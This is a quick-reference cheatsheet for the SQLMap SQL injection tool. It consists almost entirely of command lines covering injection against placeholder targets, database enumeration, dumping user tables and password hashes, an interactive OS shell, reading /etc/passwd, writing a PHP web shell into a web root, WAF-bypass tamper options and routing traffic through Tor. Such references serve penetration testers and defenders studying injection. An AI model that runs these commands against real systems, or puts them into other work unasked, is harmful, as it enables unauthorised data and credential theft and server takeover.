# SQLMap Cheatsheet

> Quick reference for SQLMap automated SQL injection.

```bash
# ──────────────────────────────────────────────
# BASIC TESTING
# ──────────────────────────────────────────────
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --batch   # No prompts

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Use Burp request file
sqlmap -r request.txt
sqlmap -r request.txt --level=5 --risk=3

# ──────────────────────────────────────────────
# AUTHENTICATION
# ──────────────────────────────────────────────
# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# With HTTP auth
sqlmap -u "http://target.com/page?id=1" --auth-type=basic --auth-cred="admin:password"

# ──────────────────────────────────────────────
# ENUMERATION
# ──────────────────────────────────────────────
--dbs                          # List databases
-D mydb --tables               # List tables in database
-D mydb -T users --columns     # List columns in table
-D mydb -T users --dump        # Dump table data
-D mydb -T users -C user,pass --dump  # Specific columns only

--current-db                   # Current database
--current-user                 # Current DB user
--is-dba                       # Check if DBA privileges
--passwords                    # Dump DB user password hashes
--privileges                   # Enumerate privileges

# ──────────────────────────────────────────────
# ADVANCED
# ──────────────────────────────────────────────
--level=5              # Test level (1-5, default 1)
--risk=3               # Risk level (1-3, default 1)
--dbms=mysql           # Specify DBMS (mysql/mssql/oracle/postgres/sqlite)
--technique=BEU        # B=Boolean, E=Error, U=Union, T=Time, S=Stacked
--time-sec=5           # Time delay for time-based blind

# OS interaction
--os-shell             # Interactive OS shell (if privileges allow)
--os-cmd="whoami"      # Single OS command
--file-read="/etc/passwd"          # Read file
--file-write="shell.php" --file-dest="/var/www/html/shell.php"  # Write file

# ──────────────────────────────────────────────
# BYPASS WAF/FILTERS
# ──────────────────────────────────────────────
--tamper=space2comment           # Replace spaces with /**/
--tamper=charencode              # URL encode chars
--tamper=randomcase              # Randomize case
--tamper=between                 # Replace > with BETWEEN
--tamper=space2comment,charencode  # Combine tampers
--random-agent                   # Use random User-Agent
--tor                            # Route through Tor
--proxy=http://127.0.0.1:8080    # Use Burp proxy

# ──────────────────────────────────────────────
# OUTPUT
# ──────────────────────────────────────────────
-v 3                   # Verbosity (0-6)
--output-dir=/tmp/out  # Output directory
--flush-session        # Clear cached results for target
```
